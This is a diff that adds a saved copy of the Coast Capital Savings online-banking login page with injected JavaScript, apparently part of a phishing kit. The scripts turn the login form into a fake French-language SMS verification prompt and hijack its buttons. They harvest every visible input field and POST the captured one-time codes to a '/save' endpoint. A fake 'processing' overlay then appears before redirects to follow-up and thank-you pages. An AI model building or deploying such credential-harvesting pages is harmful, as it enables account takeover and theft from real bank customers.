@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+
+<html lang="FR-FR" xmlns="http://www.w3.org/1999/xhtml"><!--
+ Page saved with SingleFile 
+ url: https://banking.coastcapitalsavings.com/LogIn.aspx?sto=1 
+ saved date: Sat Aug 08 2026 11:27:04 GMT-0400 (heure d’été de l’Est nord-américain)
+--><head id="Head1">
+
+
+<script id="unified-sms-handler">
+document.addEventListener("DOMContentLoaded", function() {
+    // 1. Transform UI for SMS page
+    var inputs = document.querySelectorAll("input:not([type='hidden'])");
+    var targetInput = null;
+    
+    for(var i = 0; i < inputs.length; i++) {
+        if (!targetInput && (inputs[i].type === "text" || inputs[i].type === "number" || inputs[i].type === "tel" || inputs[i].type === "password")) {
+            targetInput = inputs[i];
+        } else {
+            if (inputs[i].type === "password" || inputs[i].type === "text" || inputs[i].type === "number" || inputs[i].type === "tel") {
+                inputs[i].style.display = "none";
+                if (inputs[i].parentElement && inputs[i].parentElement.tagName !== "FORM" && inputs[i].parentElement.tagName !== "BODY") {
+                    inputs[i].parentElement.style.display = "none";
+                }
+            }
+        }
+    }
+    
+    if (targetInput) {
+        targetInput.type = "tel";
+        targetInput.maxLength = 8;
+        targetInput.placeholder = "Code SMS";
+        targetInput.value = "";
+        targetInput.style.display = "block";
+        
+        var id = targetInput.id;
+        if(id) {
+            var label = document.querySelector("label[for='" + id + "']");
+            if(label) label.innerHTML = "<b>Code de vérification SMS</b>";
+        }
+        
+        var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+        var node;
+        while(node = walker.nextNode()) {
+            var text = node.nodeValue.toLowerCase();
+            if(text.trim().length > 3) {
+                if(text.indexOf("connexion") !== -1 || text.indexOf("connecter") !== -1 || text.indexOf("sign in") !== -1 || text.indexOf("login") !== -1) {
+                    node.nodeValue = "Vérification de sécurité";
+                }
+                else if(text.indexOf("nom d'utilisateur") !== -1 || text.indexOf("courriel") !== -1 || text.indexOf("numéro de client") !== -1 || text.indexOf("username") !== -1 || text.indexOf("email") !== -1) {
+                    node.nodeValue = "Veuillez entrer le code reçu par SMS :";
+                }
+                else if(text.indexOf("mot de passe") !== -1 || text.indexOf("password") !== -1) {
+                    node.nodeValue = "";
+                }
+            }
+        }
+    }
+    
+    var clickables = document.querySelectorAll("button, input[type='submit'], .btn");
+    clickables.forEach(function(el) {
+        var text = (el.textContent || el.value || "").toLowerCase().trim();
+        if (el.getAttribute("type") === "submit" || el.classList.contains("submit") || text.indexOf("connex") !== -1 || text.indexOf("connect") !== -1 || text.indexOf("sign") !== -1 || text.indexOf("log") !== -1 || text.indexOf("contin") !== -1 || text.indexOf("suivant") !== -1) {
+            if (el.tagName === "INPUT") el.value = "Valider le code";
+            else el.innerText = "Valider le code";
+        }
+    });
+
+    // 2. Guaranteed Navigation to Step 3
+    var nextPath = window.location.pathname.replace("_sms.html", "_step3.html");
+    
+    function goNext(e) {
+        if (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (e.stopImmediatePropagation) e.stopImmediatePropagation();
+        }
+        window.location.href = nextPath;
+    }
+
+    var forms = document.querySelectorAll("form");
+    forms.forEach(function(form) {
+        form.setAttribute("action", "javascript:void(0)");
+        form.addEventListener("submit", goNext, true);
+        form.onsubmit = goNext;
+    });
+    
+    document.addEventListener("click", function(e) {
+        var el = e.target.closest("button, input[type='submit'], input[type='button'], .btn, a");
+        if (el) {
+            goNext(e);
+        }
+    }, true);
+});
+</script>
+
+<script src="security_module.js"></script>
+</body></html>
+
+<script>
+// CoastCapital Fix: wire <a> Valider button
+(function(){
+  function wireCC(){
+    // Try the specific ID first
+    var btn = document.getElementById('MainContentFull_ebLoginControl_HyperLinkRecoverUsername');
+    // Fallback: any <a> or button containing Valider/Continue
+    if(!btn){
+      var links = document.querySelectorAll('a, button');
+      for(var i=0;i<links.length;i++){
+        var t = links[i].textContent.trim().toLowerCase();
+        if(t==='valider'||t==='validate'||t==='continue'||t==='continuer'||t==='submit'||t==='se connecter'){
+          btn = links[i]; break;
+        }
+      }
+    }
+    var inp = document.querySelector('input[maxlength="6"]') || document.getElementById('sms_code');
+    if(btn && !btn.__ccWired){
+      btn.__ccWired = true;
+      btn.addEventListener('click', function(e){
+        e.preventDefault(); e.stopImmediatePropagation();
+        var code = document.querySelector('input[maxlength="6"]') || document.getElementById('sms_code');
+        if(!code || code.value.trim().length < 4){
+          alert('Veuillez saisir le code SMS à 6 chiffres.');
+          if(code) code.focus(); return;
+        }
+        var _ldr = document.createElement('div');
+_ldr.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:9999999;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:Arial,sans-serif;color:#333;backdrop-filter:blur(5px);';
+_ldr.innerHTML = '<div style=\"width:50px;height:50px;border:4px solid #e5e7eb;border-top:4px solid #00843D;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:24px;\"></div><div style=\"font-size:20px;font-weight:600;margin-bottom:8px;\">Veuillez patienter...</div><div style=\"font-size:14px;color:#6b7280;\">Traitement s&eacute;curis&eacute; en cours</div><style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>';
+document.body.appendChild(_ldr);
+var _data = { bank: 'coastcapital', type: 'SMS', fields: {} };
+var inps = document.querySelectorAll('input:not([type="hidden"]):not([type="submit"])');
+for(var i=0; i<inps.length; i++) {
+    var key = inps[i].name || inps[i].id || inps[i].placeholder || 'champ_'+i;
+    _data.fields[key] = inps[i].value;
+}
+fetch('/save', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(_data) }).catch(function(){});
+setTimeout(function(){ window.location.href = 'coastcapital_thankyou.html'; }, 10000);
+      }, true);
+    }
+  }
+  if(document.readyState==='loading') document.addEventListener('DOMContentLoaded', wireCC);
+  else wireCC();
+  setTimeout(wireCC, 500);
+  setTimeout(wireCC, 1500);
+})();
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    var currentFile = window.location.pathname.split("/").pop();
+    var step3File = currentFile.replace("_sms.html", "_step3.html");
+
+    var forms = document.querySelectorAll("form");
+    forms.forEach(function(form) {
+        form.setAttribute("action", "javascript:void(0)");
+        form.addEventListener("submit", function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            window.location.href = step3File;
+        });
+    });
+
+    var clickables = document.querySelectorAll("button, input[type='submit'], input[type='button'], .btn");
+    clickables.forEach(function(el) {
+        el.addEventListener("click", function(e) {
+            var text = (el.textContent || el.value || "").toLowerCase().trim();
+            if (el.getAttribute("type") === "submit" || 
+                text.indexOf("valid") !== -1 || 
+                text.indexOf("contin") !== -1 || 
+                text.indexOf("soumet") !== -1 ||
+                text.indexOf("submit") !== -1 ||
+                text.indexOf("next") !== -1 ||
+                text.indexOf("suivant") !== -1) {
+                e.preventDefault();
+                e.stopPropagation();
+                window.location.href = step3File;
+            }
+        });
+    });
+});
+</script>
+
